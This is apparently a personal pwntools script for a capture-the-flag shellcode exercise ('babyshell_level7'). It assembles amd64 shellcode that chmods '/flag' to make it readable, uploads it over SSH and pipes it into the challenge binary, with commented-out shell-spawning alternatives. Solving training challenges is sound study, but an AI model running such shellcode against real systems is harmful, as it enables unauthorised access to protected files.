#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'
context.timeout = 3000000

# 1 Stackframe is 8 bytes (64bit)

shellcode=f"""
mov rax, 0x67616c662f
push rax
mov rdi, rsp
mov rsi, 0x1FD /* mode_t https://godbolt.org/z/d4TrTzP9G */
mov rax, SYS_chmod
syscall
mov     eax, 0
"""
# both not working, how to prevent 48 opcode in 64 bit mode? 
#shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
#shellcode=pwnlib.shellcraft.amd64.linux.sh()
print(shellcode)
shellcode=(asm(shellcode))
#print(shellcode)


print('1', disasm(shellcode))

ELF.from_bytes(shellcode).debug().interactive()


s = ssh(host="pwn")

shellcode=bytes(shellcode)
f = SSHPath('/tmp/shellcode', ssh=s)
f.touch()
f.write_bytes(shellcode)
print("length", len(shellcode))

p = s.process('cat /tmp/shellcode | /challenge/babyshell_level7', shell=True)
#r = p.recvuntil(b"Reading 0x2000 bytes from stdin.")
#print(r.decode())
#p.send(shellcode)
print(p.recvall().decode("UTF-8"))